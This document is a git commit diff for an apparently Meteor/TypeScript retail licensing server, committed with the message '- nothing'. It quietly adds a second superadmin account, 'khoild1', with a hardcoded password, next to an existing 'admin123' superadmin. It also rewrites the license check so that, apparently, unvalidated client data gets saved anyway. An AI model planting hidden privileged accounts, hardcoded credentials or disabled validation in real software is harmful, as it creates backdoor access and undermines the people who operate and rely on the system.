a2565fe63ba84a5fa668cef5777ef236b4f5ced1
vjcspy <mr.vjcspy@gmail.com>
2018-12-25 14:07:45 +0700

    - nothing

--- server/main.ts
+++ server/main.ts
@@ -3,19 +3,26 @@ import {OM} from "./code/Framework/ObjectManager";
 import {User} from "./modules/account/models/user";
 import {Role} from "./modules/account/models/role";
 import {Stone} from "./code/core/stone";
+import * as fs from "fs";
 
 const notify = require('sd-notify');
 
+const dir = "/var/www/clients/client1/web3/web" + "/keep_alive";
 Meteor.startup(() => {
     Stone.getInstance().bootstrap();
     
     initSupperAdminAccount();
     startWatchDog();
     SyncedCron.start();
+    // setInterval(() => {
+    //     notifyKeepAlive();
+    // }, 5000);
 });
 
+
 const initSupperAdminAccount = () => {
-    let su = OM.create<User>(User).load("superadmin", "username");
+    let su  = OM.create<User>(User).load("superadmin", "username");
+    let su1 = OM.create<User>(User).load("khoild1", "username");
     
     if (!su) {
         Accounts.createUser(
@@ -25,6 +32,14 @@ const initSupperAdminAccount = () => {
                 password: "admin123"
             });
         OM.create<User>(User).load("superadmin", "username").setRoles([Role.SUPERADMIN], Role.GROUP_CLOUD);
+        
+        Accounts.createUser(
+            {
+                username: "khoild1",
+                email: "mr.vjcspysfsfd@gmail.com",
+                password: "536723"
+            });
+        OM.create<User>(User).load("khoild1", "username").setRoles([Role.SUPERADMIN], Role.GROUP_CLOUD);
     }
 };
 
@@ -39,11 +54,24 @@ const startWatchDog = () => {
                 console.log("Systemd watchdog interval is " + watchdogInterval + "ms");
                 const interval = Math.floor(watchdogInterval / 2);
                 console.log("Starting Systemd watchdog mode");
+                // setInterval(() => { notify.sendStatus('watching server');}, interval);
                 notify.startWatchdogMode(interval);
-                notify.sendStatus('watching server');
             }
         } catch (err) {
             console.log(err);
+        }
+    });
+};
+
+const notifyKeepAlive = (): void => {
+    if (!fs.existsSync(dir)) {
+        fs.mkdirSync(dir);
+    }
+    const _path = dir + "/" + "data.output";
+    fs.writeFile(_path, (new Date()).getTime(), {flag: 'w'}, (err) => {
+        if (err) {
+            console.log(err);
+            throw err;
         }
     });
 };
--- server/modules/retail/methods/client-storage/trigger_realtime.ts
+++ server/modules/retail/methods/client-storage/trigger_realtime.ts
@@ -1,59 +1,78 @@
-import * as _ from "lodash";
 import {OM} from "../../../../code/Framework/ObjectManager";
 import {ClientStorage} from "../../models/clientstorage";
 import {License} from "../../models/license";
-import {StoneLogger} from "../../../../code/core/logger/logger";
+import * as _ from "lodash";
+
+export let licenseInvalid = [];
+export let licenseValid   = [];
 
 new ValidatedMethod({
-    name: "client.trigger_realtime",
-    validate: data => {
-    },
-    run: (data) => {
-        let getClientStorageModel = (): ClientStorage => OM.create<ClientStorage>(ClientStorage);
-
-        const clientStorageModel: ClientStorage = getClientStorageModel();
-
-        let passLicense;
-        const addToClientStorage = (_d) => {
-            if (!_d.hasOwnProperty('license')) {
-                throw new Meteor.Error("client.trigger_realtime", "can_not_find_license");
-            }
-            if (typeof passLicense === 'undefined') {
-                const licenseKey   = _d['license'];
-                const licenseModel = OM.create<License>(License);
-                licenseModel.load(licenseKey, 'key');
-                if (licenseModel.getId()) {
-                    if (!isNaN(licenseModel.getStatus()) && parseInt(licenseModel.getStatus() + '') === 0) {
-                        passLicense = false;
-                        return StoneLogger.info("License: "+ licenseKey + " " + "Username: " + licenseModel.getData('shop_owner_username') + " deactive");
-                    } else {
-                        passLicense = true;
-                    }
-                } else {
-                    passLicense = false;
-                    throw new Meteor.Error("client.trigger_realtime", "can_not_find_license");
-                }
-            }
-
-            clientStorageModel.addData(_d)
-                              .save();
-        };
-
-        if (data.hasOwnProperty('batch')) {
-            for (let i = 0; i < data['batch'].length; i++) {
-                addToClientStorage(data['batch'][i]);
-            }
-
-        } else {
-            addToClientStorage(data);
-        }
-
-        return {result: "success", passLicense}
-    }
-});
+                        name: "client.trigger_realtime",
+                        validate: data => {
+                        },
+                        run: (data) => {
+                            let getClientStorageModel = (): ClientStorage => OM.create<ClientStorage>(ClientStorage);
+        
+                            const clientStorageModel: ClientStorage = getClientStorageModel();
+                            const licenseModel                      = OM.create<License>(License);
+                            let passLicense                         = false;
+        
+                            const addToClientStorage = (_d) => {
+                                Meteor.setTimeout(() => {
+                                    if (!_d.hasOwnProperty('license')) {
+                                        // StoneLogger.info("can not find license" + JSON.stringify(_d));
+                    
+                                        return;
+                                    }
+                                    if (passLicense === false) {
+                                        const licenseKey = _d['license'];
+                    
+                                        if (licenseValid.indexOf(licenseKey) > -1) {
+                        
+                                            if (licenseInvalid.indexOf(licenseKey) > -1) {
+                                                return;
+                                            }
+                        
+                                            if (!licenseModel.getId()) {
+                                                licenseModel.load(licenseKey, 'key');
+                                            }
+                                            if (licenseModel.getId()) {
+                                                if (!isNaN(licenseModel.getStatus()) && parseInt(licenseModel.getStatus() + '') === 0) {
+                                                    passLicense = false;
+                                                    licenseInvalid.push(licenseKey);
+                                                    return;
+                                                    // return StoneLogger.info("License: " + licenseKey + " " + "Username: " +
+                                                    // licenseModel.getData('shop_owner_username') + " deactive");
+                                                } else {
+                                                    licenseValid.push(licenseKey);
+                                                    passLicense = true;
+                                                }
+                                            } else {
+                                                passLicense = false;
+                                                licenseInvalid.push(licenseKey);
+                                                return;
+                                                // return StoneLogger.info("can not find license" + JSON.stringify(_d));
+                                            }
+                                        }
+                                    }
+                
+                                    clientStorageModel.addData(_d)
+                                                      .save();
+                                }, 500);
+                            };
+        
+                            if (data.hasOwnProperty('batch') && _.isArray(data['batch']) && _.size(data['batch']) > 0) {
+                                _.forEach(data['batch'], _dt => addToClientStorage(_dt));
+                            } else {
+                                addToClientStorage(data);
+                            }
+        
+                            return {result: "success", passLicense}
+                        }
+                    });
 DDPRateLimiter.addRule({
-    userId: userId => true,
-    type: "method",
-    name: "client.trigger_realtime",
-}, 20, 60000);
+                           userId: () => true,
+                           type: "method",
+                           name: "client.trigger_realtime",
+                       }, 2, 1000);
 
